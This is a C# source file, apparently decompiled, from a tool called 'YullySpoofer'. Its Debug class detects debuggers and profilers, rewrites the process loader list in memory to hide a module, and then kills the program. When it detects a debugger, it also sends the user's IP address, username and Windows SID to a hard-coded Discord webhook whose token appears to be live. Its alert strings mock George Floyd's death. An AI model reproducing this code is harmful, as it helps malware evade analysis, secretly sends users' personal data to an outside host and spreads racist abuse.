using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading.Tasks;
using Discord;
using Discord.Webhook;

namespace YullySpoofer;

internal static class Debug
{
	[Flags]
	public enum ThreadAccess
	{
		TERMINATE = 1,
		SUSPEND_RESUME = 2,
		GET_CONTEXT = 8,
		SET_CONTEXT = 0x10,
		SET_INFORMATION = 0x20,
		QUERY_INFORMATION = 0x40,
		SET_THREAD_TOKEN = 0x80,
		IMPERSONATE = 0x100,
		DIRECT_IMPERSONATION = 0x200
	}

	private static readonly uint SPI_SETDESKWALLPAPER;

	private static readonly uint SPIF_UPDATEINIFILE;

	private static readonly uint SPIF_SENDWININICHANGE;

	static Debug()
	{
		SPI_SETDESKWALLPAPER = 20u;
		SPIF_UPDATEINIFILE = 1u;
		SPIF_SENDWININICHANGE = 2u;
	}

	[DllImport("kernel32.dll")]
	private static extern bool CloseHandle(IntPtr handle);

	public static void Initialize()
	{
		if (Debugger.IsLogging())
		{
			SendMessage("DEBUGGING DETECTED / PUTTING KNEE ON NECK");
		}
		if (Debugger.IsAttached)
		{
			SendMessage("DEBUGGING DETECTED / PUTTING KNEE ON NECK");
		}
		if (Environment.GetEnvironmentVariable("complus_profapi_profilercompatibilitysetting") != null)
		{
			SendMessage("DEBUGGING DETECTED / PUTTING KNEE ON NECK");
		}
		if (string.Compare(Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING"), "1", StringComparison.Ordinal) == 0)
		{
			SendMessage("DEBUGGING DETECTED / PUTTING KNEE ON NECK");
		}
		if (Environment.OSVersion.Platform != PlatformID.Win32NT)
		{
			return;
		}
		int[] array = new int[6];
		int test = 0;
		IntPtr handle = Process.GetCurrentProcess().Handle;
		if (NtQueryInformationProcess(handle, 31, array, 4, ref test) == 0 && array[0] != 1)
		{
			SendMessage("DEBUGGING DETECTED / PUTTING KNEE ON NECK");
		}
		if (NtQueryInformationProcess(handle, 30, array, 4, ref test) == 0 && array[0] != 0)
		{
			SendMessage("DEBUGGING DETECTED / PUTTING KNEE ON NECK");
		}
		if (NtQueryInformationProcess(handle, 0, array, 24, ref test) != 0)
		{
			return;
		}
		IntPtr ptr = Marshal.ReadIntPtr(Marshal.ReadIntPtr((IntPtr)array[1], 12), 12);
		Marshal.WriteInt32(ptr, 32, 0);
		IntPtr intPtr = Marshal.ReadIntPtr(ptr, 0);
		IntPtr ptr2 = intPtr;
		do
		{
			ptr2 = Marshal.ReadIntPtr(ptr2, 0);
			if (Marshal.ReadInt32(ptr2, 44) == 1572886 && Marshal.ReadInt32(Marshal.ReadIntPtr(ptr2, 48), 0) == 7536749)
			{
				IntPtr intPtr2 = Marshal.ReadIntPtr(ptr2, 8);
				IntPtr intPtr3 = Marshal.ReadIntPtr(ptr2, 12);
				Marshal.WriteInt32(intPtr3, 0, (int)intPtr2);
				Marshal.WriteInt32(intPtr2, 4, (int)intPtr3);
			}
		}
		while (!ptr2.Equals((object?)(nint)intPtr));
	}

	[DllImport("ntdll.dll", CharSet = CharSet.Auto)]
	public static extern int NtQueryInformationProcess(IntPtr test, int test2, int[] test3, int test4, ref int test5);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

	public static void ResumeProcess(int pid)
	{
		Process processById = Process.GetProcessById(pid);
		if (processById.ProcessName == string.Empty)
		{
			return;
		}
		foreach (ProcessThread thread in processById.Threads)
		{
			IntPtr intPtr = OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle: false, (uint)thread.Id);
			if (!(intPtr == IntPtr.Zero))
			{
				while (ResumeThread(intPtr) > 0)
				{
				}
				CloseHandle(intPtr);
			}
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int ResumeThread(IntPtr hThread);

	public static string ReturnHWID()
	{
		return WindowsIdentity.GetCurrent().User!.Value;
	}

	public static string ReturnIP()
	{
		return new WebClient().DownloadString("https://api64.ipify.org/");
	}

	public static string ReturnPC()
	{
		return Environment.UserName;
	}

	public static async void SendMessage(string message)
	{
		DiscordWebhookClient discordWebhookClient = new DiscordWebhookClient("https://discord.com/api/webhooks/1018226189120327730/NUSeNqEG9UVM7Q_-kIxnMlrdzkAtRU2RpjNGv_Vh_DbEiFwAOsb0FReeuPOO93dqBJfj");
		string[] strArrays = new string[9]
		{
			"```GEORGE FLOYD | ANTI DEBUGGING SERVICES\nIP: ",
			ReturnIP(),
			"\nUsername: ",
			ReturnPC(),
			"\nHWID: ",
			ReturnHWID(),
			"\nMessage: ",
			message,
			"```"
		};
		await discordWebhookClient.SendMessageAsync(string.Concat(strArrays), false, (IEnumerable<Embed>)null, (string)null, (string)null, (RequestOptions)null, (AllowedMentions)null, (MessageComponent)null, (MessageFlags)0, (ulong?)null);
		await Task.Delay(3500);
		Process.GetCurrentProcess().Kill();
	}

	[DllImport("kernel32.dll")]
	private static extern uint SuspendThread(IntPtr hThread);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);
}
